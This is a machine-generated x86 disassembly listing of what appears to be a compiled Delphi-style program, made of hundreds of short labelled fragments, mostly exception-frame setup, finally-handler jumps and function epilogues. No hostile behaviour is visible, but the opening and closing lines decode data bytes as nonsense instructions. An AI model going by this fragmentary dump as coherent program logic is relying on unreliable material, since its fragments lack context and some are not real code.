add [ eax ] al
lodsb [ esi ]
jo r-xdata
dec eax
add [ ebx ] dh
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_472a00
retn
add [ esi - 0x76ffb8d7 ] ch
retn
sub_4729f9
jmp sub_4038d0
sub_472a00
pop ebp
retn
sub_472a04
sub [ rw-data ] 0x1
retn
sub_473058
jmp sub_4038d0
sub_47305f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47307c
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_473075
jmp sub_4038d0
sub_47307c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473148
jmp sub_4038d0
sub_47314f
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_473300
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_473399
jmp sub_4038d0
sub_4733a0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4733fe
jmp sub_4038d0
sub_473405
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473710
jmp sub_4038d0
sub_473717
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473942
jmp sub_4038d0
sub_473949
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4739d6
jmp sub_4038d0
sub_4739dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473a5c
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_42109c
sub_473c6d
jmp sub_4038d0
sub_473cec
jmp sub_4038d0
sub_473cf3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_473dc1
jmp sub_4038d0
sub_473e1e
jmp sub_4038d0
sub_473e25
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473eac
jmp sub_4038d0
sub_473eb3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473ffe
jmp sub_4038d0
sub_474005
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474024
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_47401d
jmp sub_4038d0
sub_474024
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474041
lea eax [ ebp - 0x14 ]
call sub_403f50
retn
sub_47403a
jmp sub_4038d0
sub_474041
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_474104
mov eax [ eax + 0xb0 ]
call sub_41b238
retn
sub_474110
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_4741ee
jmp sub_4038d0
sub_4741f5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4742d1
jmp sub_4038d0
sub_4742d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47442a
jmp sub_4038d0
sub_474431
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47445b
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_474454
jmp sub_4038d0
sub_47445b
pop ebx
mov esp ebp
pop ebp
retn
sub_4744ba
jmp sub_4038d0
sub_4744c1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47456e
jmp sub_4038d0
sub_474575
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47458b
inc [ edx ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax ] al
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4745a0
push ebx
mov ebx eax
mov eax ebx
call sub_41b238
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_474688
jmp sub_4038d0
sub_47468f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_474698
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_474790
jmp sub_4038d0
sub_474797
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4747f9
jmp sub_4038d0
sub_474800
pop ebp
retn
sub_474804
sub [ rw-data ] 0x1
retn
sub_474a9a
jmp sub_4038d0
sub_474aa1
pop ebx
pop ecx
pop ebp
retn
sub_474aa8
retn
sub_474aac
retn
sub_474ab0
retn
sub_474ab4
retn
sub_474b7f
jmp sub_4038d0
sub_474b86
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_474b9c
jmp sub_4038d0
sub_474bc6
jmp sub_4038d0
sub_474bcd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_474bd7
jmp sub_403748
j_sub_40361c
jmp sub_40361c
sub_474d4a
jmp sub_4038d0
sub_474d51
pop ecx
pop ebp
retn
sub_474db2
jmp sub_4038d0
sub_474db9
pop ecx
pop ebp
retn
sub_474e1f
jmp sub_4038d0
sub_474e34
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_474e48
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_474e60
mov [ eax + 0x49 ] 0x1
call sub_420f20
retn
sub_474e6c
add eax 0x40
call sub_40d130
retn
sub_474e9d
jmp sub_4038d0
sub_474ea4
pop ebp
retn
sub_474ea8
sub [ rw-data ] 0x1
retn
sub_475009
jmp sub_4038d0
sub_475010
pop ebp
retn
sub_475014
sub [ rw-data ] 0x1
retn
sub_475125
jmp sub_4038d0
sub_47512c
pop ebp
retn
sub_475130
sub [ rw-data ] 0x1
retn
sub_4752f5
jmp sub_4038d0
sub_4752fc
pop ebp
retn
sub_475300
sub [ rw-data ] 0x1
retn
sub_4753dc
jmp sub_4038d0
sub_4753e3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47551d
jmp sub_4038d0
sub_475524
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475551
jmp sub_4038d0
sub_475558
pop ebp
retn
sub_47555c
sub [ rw-data ] 0x1
retn
sub_4755a9
jmp sub_4038d0
sub_4755e1
jmp sub_4038d0
sub_4755e8
pop ebp
retn
sub_4755ec
sub [ rw-data ] 0x1
retn
sub_47583b
jmp sub_4038d0
sub_475842
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47587c
retn
sub_4758a5
jmp sub_4038d0
sub_4758ac
pop ebp
retn
sub_4758b0
sub [ rw-data ] 0x1
retn
sub_475aa5
jmp eax
sub_476938
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_476958
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
push edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_4769b4
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_476b02
jmp sub_4038d0
sub_476b46
jmp sub_4038d0
sub_476b4d
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476b64
push ebx
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_476c0c
jmp sub_4038d0
sub_476c13
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476c18
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x1c ]
retn
sub_476e92
jmp sub_4038d0
sub_476eac
push esi
mov esi eax
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_476ebc
mov eax [ eax + 0x70 ]
mov [ eax + 0x1c ] edx
retn
sub_476ec4
mov ecx edx
mov [ eax + 0x84 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_42109c
sub_476fdc
jmp sub_4038d0
sub_477080
jmp sub_4038d0
sub_477108
jmp sub_4038d0
sub_47710f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47714c
retn
sub_477150
push ebx
mov ebx eax
mov eax ebx
call sub_474aac
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
j_sub_403748#4
jmp sub_403748
sub_4773b5
jmp sub_40361c
sub_477424
mov edx [ eax + 0x68 ]
mov edx [ edx + 0xb8 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x40 ]
retn
j_sub_403748#3
jmp sub_403748
j_sub_403748#5
jmp sub_403748
sub_4775fa
jmp sub_4038d0
sub_477601
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477608
push ebx
mov ebx eax
mov eax ebx
call sub_419180
pop ebx
retn
sub_477658
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4192f8
pop esi
pop ebx
retn
sub_47766c
push esi
mov si 0xffff
call sub_403350
pop esi
retn
sub_477868
jmp sub_403748
sub_47796b
jmp sub_4038d0
sub_477995
jmp sub_4038d0
sub_47799c
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477a6f
jmp sub_4038d0
sub_477a76
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_477acc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_403fa4
pop esi
pop ebx
retn
sub_477b5d
jmp sub_4038d0
sub_477b64
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_477b94
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_477c48
push ebx
mov edx [ eax + 0x4 ]
cmp [ edx + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_477cb5
jmp sub_4038d0
sub_477cbc
pop ebp
retn
sub_477cc0
sub [ rw-data ] 0x1
retn
sub_477dd1
jmp sub_4038d0
sub_477dd8
pop ebp
retn
sub_477ddc
sub [ rw-data ] 0x1
retn
sub_47811a
jmp sub_4038d0
sub_478121
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_478240
jmp sub_4038d0
sub_478247
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4782fb
jmp sub_4038d0
sub_478302
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47832c
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_478325
jmp sub_4038d0
sub_47832c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4783d2
jmp sub_4038d0
sub_4783d9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478403
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_4783fc
jmp sub_4038d0
sub_478403
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4784d2
jmp sub_4038d0
sub_4784d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478614
jmp sub_4038d0
sub_47861b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4786a3
jmp sub_4038d0
sub_4786aa
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47877f
jmp sub_4038d0
sub_478786
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4787b5
jmp sub_4038d0
sub_4787bc
pop ebp
retn
sub_4787c0
sub [ rw-data ] 0x1
retn
sub_4788c7
jmp sub_4038d0
sub_4788ce
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_478de7
jmp sub_4038d0
sub_478dee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478ff4
jmp sub_4038d0
sub_478ffb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479041
jmp sub_4038d0
sub_479048
pop ebp
retn
sub_47904c
sub [ rw-data ] 0x1
retn
sub_4794dc
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_479578
retn
sub_479594
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4795b4
retn
sub_4796ff
jmp sub_4038d0
sub_479706
pop ebp
retn
sub_479708
sub [ rw-data ] 0x1
retn
sub_479894
retn
sub_479895
jmp sub_4038d0
j_sub_479894
jmp sub_479894
sub_47989c
pop ebp
retn
sub_4798a0
sub [ rw-data ] 0x1
retn
sub_479c63
jmp sub_4038d0
sub_479c6a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479e69
jmp sub_4038d0
sub_479e70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_479f1d
jmp sub_4038d0
sub_479f24
pop ebp
retn
sub_479f28
sub [ rw-data ] 0x1
retn
sub_47a1c1
jmp sub_4038d0
sub_47a1c8
pop ebp
retn
sub_47a1cc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_479aa4
sub_47a33e
jmp sub_4038d0
sub_47a345
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47a406
jmp sub_4038d0
sub_47a40d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a5f3
jmp sub_4038d0
sub_47a5fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47a669
jmp sub_4038d0
sub_47a670
pop ebp
retn
sub_47a674
sub [ rw-data ] 0x1
retn
sub_47a9ee
jmp sub_4038d0
sub_47a9f5
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_47aac6
jmp sub_4038d0
sub_47ab56
jmp sub_4038d0
sub_47ab5d
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_47adb8
jmp sub_4038d0
sub_47adbf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ade9
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_403f74
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_47ade2
jmp sub_4038d0
sub_47ade9
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b056
jmp sub_4038d0
sub_47b05d
pop ebx
mov esp ebp
pop ebp
retn
sub_47b2d5
jmp sub_4038d0
sub_47b2dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b3d7
jmp [ ecx ]
sub_47b5a8
lea eax [ ebp - 0x8 ]
call sub_40d130
retn
sub_47b5b1
jmp sub_4038d0
j_sub_47b5a8
jmp sub_47b5a8
sub_47b5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b5dd
lea eax [ ebp - 0x1c ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_47b5d6
jmp sub_4038d0
sub_47b5dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47b615
jmp sub_4038d0
sub_47b61c
pop ebp
retn
sub_47b698
retn
sub_47b699
jmp sub_4038d0
j_sub_47b698
jmp sub_47b698
sub_47b6a0
pop ebp
retn
sub_47b6a4
sub [ rw-data ] 0x1
retn
sub_47bb05
jmp sub_4038d0
sub_47bb0c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47bc62
jmp sub_4038d0
sub_47bc69
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47bcfa
jmp sub_4038d0
sub_47bd01
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47bd3d
jmp sub_4038d0
sub_47bd44
pop ebp
retn
sub_47bd48
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_479aa4
sub_47bffd
jmp sub_4038d0
sub_47c004
pop ebp
retn
sub_47c008
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx rw-data
mov edx [ rw-data ]
mov eax [ r-xdata ]
call sub_479aa4
sub_47c48d
jmp sub_4038d0
sub_47c494
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c5e6
jmp sub_4038d0
sub_47c5ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c60f
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403f74
retn
sub_47c608
jmp sub_4038d0
sub_47c60f
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c7bc
jmp sub_4038d0
sub_47c7c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c7ed
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_47c7e6
jmp sub_4038d0
sub_47c7ed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c88d
jmp sub_4038d0
sub_47c894
pop ebp
retn
sub_47cad9
jmp sub_4038d0
sub_47cae0
pop ebp
retn
sub_47cae4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ca34
mov ecx eax
mov edx r-xdata
mov eax [ r-xdata ]
call sub_479654
sub_47cb3d
jmp sub_4038d0
sub_47cb44
pop ebp
retn
sub_47cb48
sub [ rw-data ] 0x1
retn
sub_47cb75
jmp sub_4038d0
sub_47cb7c
pop ebp
retn
sub_47cb80
sub [ rw-data ] 0x1
retn
sub_47cbe8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
int3
sub_47d0a0
jmp sub_4038d0
sub_47d0a7
pop ebx
mov esp ebp
pop ebp
retn
sub_47d0f8
xor edx edx
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
retn
sub_47d192
jmp sub_4038d0
sub_47d199
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d229
jmp sub_4038d0
sub_47d230
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47d2d3
jmp sub_4038d0
sub_47d330
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_4784e0
pop esi
pop ebx
retn
sub_47d36c
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_4784e0
pop esi
pop ebx
retn
sub_47d39c
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_4786b4
retn
sub_47d3d0
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_4786b4
retn
sub_47d3fb
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47d4b2
jmp sub_4038d0
sub_47d4b9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d4f4
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
mov edx r-xdata
mov eax [ ebx + 0x28 ]
call sub_4784e0
pop esi
pop ebx
retn
sub_47d528
mov ecx edx
mov eax [ eax + 0x28 ]
mov edx r-xdata
call sub_4786b4
retn
j_sub_4038d0#9
jmp sub_4038d0
sub_47d5ef
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4038d0#8
jmp sub_4038d0
sub_47d66b
pop ebp
retn
j_sub_4038d0#7
jmp sub_4038d0
sub_47d6cc
pop ebp
retn
sub_47d6d0
sub [ rw-data ] 0x1
retn
j_sub_4038d0#6
jmp sub_4038d0
sub_47d76b
pop ebp
retn
sub_47d770
sub [ rw-data ] 0x1
retn
j_sub_4038d0#5
jmp sub_4038d0
sub_47e640
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e74a
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
j_sub_4038d0#4
jmp sub_4038d0
j_sub_47e74a
jmp sub_47e74a
sub_47e75f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e852
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
j_sub_4038d0#3
jmp sub_4038d0
j_sub_47e852
jmp sub_47e852
sub_47e867
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e9fb
lea eax [ ebp - 0x28 ]
mov edx 0x9
call sub_403f74
retn
sub_47ea09
jmp sub_4038d0
j_sub_47e9fb
jmp sub_47e9fb
sub_47ea10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47eb43
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403f74
retn
j_sub_4038d0#2
jmp sub_4038d0
j_sub_47eb43
jmp sub_47eb43
sub_47eb58
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ed15
jmp sub_4038d0
sub_47ed1c
pop ebp
retn
sub_47ed20
sub [ rw-data ] 0x1
retn
sub_47f3bc
jmp sub_4038d0
sub_47f3c3
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_4038d0
jmp sub_4038d0
sub_47f416
pop ebp
retn
sub_47f418
insb
add [ eax ] al
add [ eax ] ah
hlt
sub_47f50c
pushfd
0x42
sub_47f538
cmp al 0xcb
inc edx
add [ ebx + ecx * 8 ] cl
inc edx
add [ ecx + edx * 8 + 0x42 ] dh
add [ eax ] bl
rol [ edx ] 0x1
dec esp
0xea040042 0x42
sub_47f58b
add ah al
0x39ec0042 0x44
